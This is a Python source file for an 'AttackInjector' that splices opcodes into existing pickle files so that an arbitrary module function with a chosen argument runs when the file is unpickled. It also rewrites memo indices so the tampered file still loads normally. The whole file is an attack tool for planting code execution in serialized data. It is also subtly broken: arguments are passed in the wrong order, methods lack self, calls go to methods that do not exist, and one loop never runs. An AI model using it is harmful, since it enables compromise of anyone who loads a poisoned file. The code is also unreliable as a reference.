import struct
from pickletools import genops
from pickletools import opcodes as opcode_library

# Opcode indices within opcode_library used while injecting attacks
BINUNICODE = 21
TUPLE1 = 31
POP = 41
BINGET = 46
LONG_BINGET = 47
BINPUT = 49
LONG_BINPUT = 50
GLOBAL = 55
REDUCE = 57
EVAL_EXEC_MEMO_LEN = 4
GLOBAL_END = b"\x0A"
BYTE_MAX = 0xFF

class AttackInjector():
    def __init__(self, pickle_extractor):
        self.pickle_extractor = pickle_extractor

    @staticmethod
    def write_global(last_memo_index, out_pickle, module_str):
        """
		Params: 
			module_str: String containing information about the module we're injecting
			out_pickle: File object that will be written to

		Returns:
			None
		
		Writes a GLOBAL command to a pickle file assuming file cursor is at right place.
		"""
        out_pickle.write(opcode_library[GLOBAL].code.encode('raw_unicode_escape'))
        out_pickle.write(module_str.encode('raw_unicode_escape'))
        out_pickle.write(GLOBAL_END)
        
        return 0

    @staticmethod
    def write_get(last_memo_index, out_pickle, memo_ind):
        """
		Params: 
			memo_index: Index that will be written as part of get command
			out_pickle: File object that will be written to

		Returns:
			None
		
		Writes a BINGET or LONG_BINGET command to a pickle file assuming file cursor is at right place.
		"""
        memo_opcode = BINGET if last_memo_index <= BYTE_MAX else LONG_BINGET
        byte_length = 1 if last_memo_index <= BYTE_MAX else 4
        
        out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
        out_pickle.write(memo_ind.to_bytes(byte_length, byteorder="little"))

        return 1

    @staticmethod
    def write_put(last_memo_index, out_pickle):
        """
		Params: 
			memo_index: Index that will be written as part of put command
			out_pickle: File object that will be written to

		Returns:
			None
		
		Writes a BINPUT or LONG_BINPUT command to a pickle file assuming file cursor is at right place.
		"""
        memo_opcode = BINPUT if last_memo_index <= BYTE_MAX else LONG_BINPUT
        byte_length = 1 if last_memo_index <= BYTE_MAX else 4
        
        out_pickle.write(opcode_library[memo_opcode].code.encode('raw_unicode_escape'))
        out_pickle.write(last_memo_index.to_bytes(byte_length, byteorder="little"))

        return 1
    
    @staticmethod
    def write_binunicode(last_memo_index, out_pickle, unicode_str):
        attack_bytes = unicode_str.encode('raw_unicode_escape')
        out_pickle.write(opcode_library[BINUNICODE].code.encode('raw_unicode_escape'))
        out_pickle.write(struct.pack("<L", len(attack_bytes)))
        out_pickle.write(attack_bytes)

        return 0

    @staticmethod
    def write_simple_opcode(last_memo_index, out_pickle, opcode_lib_ind):
        out_pickle.write(opcode_library[opcode_lib_ind].code.encode('raw_unicode_escape'))

        return 0

    @staticmethod
    def memo_inject_attack(last_memo_index, out_pickle, module_str):
        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL     <module_str>
        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 1
    
    @staticmethod
    def sequential_module_attack_with_memo(last_memo_index, out_pickle, module_str, arg_str):
        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL                 <module_str>
        AttackInjector.write_put(last_memo_index + 1, out_pickle)    # BINPUT/LONG_BINPUT     N + 1
        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE             <arg_str>
        AttackInjector.write_put(last_memo_index + 2, out_pickle)    # BINPUT/LONG_BINPUT     N + 2
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
        AttackInjector.write_put(last_memo_index + 3, out_pickle)    # BINPUT/LONG_BINPUT     N + 3
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
        AttackInjector.write_put(last_memo_index + 4, out_pickle)    # BINPUT/LONG_BINPUT     N + 4
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 4

    @staticmethod
    def sequential_module_attack_without_memo(last_memo_index, out_pickle, module_str, arg_str):
        AttackInjector.write_global(None, module_str, out_pickle)    # GLOBAL         <module_str>
        AttackInjector.write_binunicode(None, out_pickle, arg_str)   # BINUNICODE     <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1) # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE) # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)    # POP

        return 0
    
    @staticmethod
    def module_attack_using_memo(last_memo_index, out_pickle, memo_ind, arg_str):
        AttackInjector.write_get(last_memo_index + 1, out_pickle, memo_ind)    # BINGET/LONG_BINGET     N + 2
        AttackInjector.write_binunicode(None, out_pickle, arg_str)             # BINUNICODE             <arg_str>
        AttackInjector.write_simple_opcode(None, out_pickle, TUPLE1)           # TUPLE1
        AttackInjector.write_simple_opcode(None, out_pickle, REDUCE)           # REDUCE
        AttackInjector.write_simple_opcode(None, out_pickle, POP)              # POP

        return 0

    def _get_all_commands(in_pickle):
        """
		Params: 
			in_pickle: bytes object containing pickle file

		Returns:
			opcodes: List of opcodes used
			args: List of arguments for opcodes used
			positions: Starting byte position in pickle file for each command
		
		Gets all commands used wihin a pickle file.
		"""
        opcodes = []
        args = []
        positions = []

        for opcode, arg, pos in genops(in_pickle):
            opcodes.append(opcode)
            args.append(arg)
            positions.append(pos)

        return opcodes, args, positions

    def _get_last_memo_index(attack_index, opcodes, args):
        """
		Params: 
			attack_index: Index we're attack at
			opcodes: Opcodes of each commmand
			args: Arguments of each command

		Returns:
			last_memo_index: Index of the last (LONG_)BINPUT command used
		
		Gets the index of the last (LONG_)BINPUT command used up until the attack index
		"""
        last_memo_index = -1
        for i in range(attack_index):
            if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
                last_memo_index = args[i]

        return last_memo_index

    def _increment_memo_args(start_index, opcodes, args):
        """
		Params: 
			attack_index: Index we're starting our incrementation by
			opcodes: Opcodes of each commmand
			args: Arguments of each command

		Returns:
			incremented_memo_record: Whether the memo recrod was incremented or not
		
		Gets the index of the last (LONG_)BINPUT command used up until the attack index
		"""
        # Increment the remaining memo records
        incremented_memo_record = False
        for i in range(start_index, -1):
            if opcodes[i].name == "BINPUT" or opcodes[i].name == "LONG_BINPUT":
                incremented_memo_record = True
                args[i] += EVAL_EXEC_MEMO_LEN
        
        return incremented_memo_record
    
    def _reconstruct_pickle_end(self, attack_index, attack_len, uses_memo, last_memo_index, in_pickle, out_pickle, opcodes, args, pos):
        """
		Reconstructs the end of a pickle file which has been modified.
		"""
        # Define where we attacked byte-wise
        attack_pos = pos[attack_index]

        if uses_memo:
            rem_opcodes = opcodes[attack_index:]
            rem_args = args[attack_index:]
            rem_pos = pos[attack_index:]

            for i in range(len(rem_opcodes)):
                opcode_is_memo = rem_opcodes[i].name == "BINPUT" or rem_opcodes[i].name == "LONG_BINPUT"
                opcode_is_get = rem_opcodes[i].name == "BINGET" or rem_opcodes[i].name == "LONG_BINGET"

                if opcode_is_get and rem_args[i] > last_memo_index:
                    # Rewrite get
                    self._write_get(rem_args[i] + attack_len, out_pickle)
                elif opcode_is_memo:
                    # Rewrite memo
                    self._write_put(rem_args[i] + attack_len, out_pickle)
                else:
                    # If this opcode is not special, just copy data from pickle file
                    in_pickle.seek(rem_pos[i])
                    bytes_read = rem_pos[i + 1] - rem_pos[i] if i != len(rem_opcodes) - 1 else -1
                    out_pickle.write(in_pickle.read(bytes_read))
        else:
            # Trivial case: no memoization, no modification
            in_pickle.seek(attack_pos)
            out_pickle.write(in_pickle.read())

    def _inject_attacks(self, attacks, attack_indices, attack_args, in_pickle, out_pickle):
        # First, extract every command from the pickle file
        opcodes, args, pos = self._get_all_commands(in_pickle)

        seek_index = 0
        memo_offset = 0
        last_memo_index = -1
        incremented_memo_args = False
        for attack, attack_index, attack_args in zip(attacks, attack_indices, attack_args):
            # Find what memo record, if any, we left off on
            last_memo_index = self._get_last_memo_index(attack_index, opcodes, args) + memo_offset

            # Increment the remaining memo records
            incremented_memo_args = self._increment_memo_args(attack_index, opcodes, args)

            # Next, copy everything from the previous pickle file into a new file
            attack_pos = pos[attack_index]
            in_pickle.seek(seek_index)
            out_pickle.write(in_pickle.read(attack_pos))

            # Inject our attack and record how long it was in the PVM memo record
            attack_memo_len = attack(last_memo_index, out_pickle, *attack_args)

            # Update our seek index and memo offset
            seek_index = attack_pos
            memo_offset += attack_memo_len

        # Reconstruct the rest of the pickle file
        self._reconstruct_pickle_end(
            attack_indices[-1],
            memo_offset,
            incremented_memo_args,
            last_memo_index,
            in_pickle,
            out_pickle,
            opcodes,
            args,
            pos
        )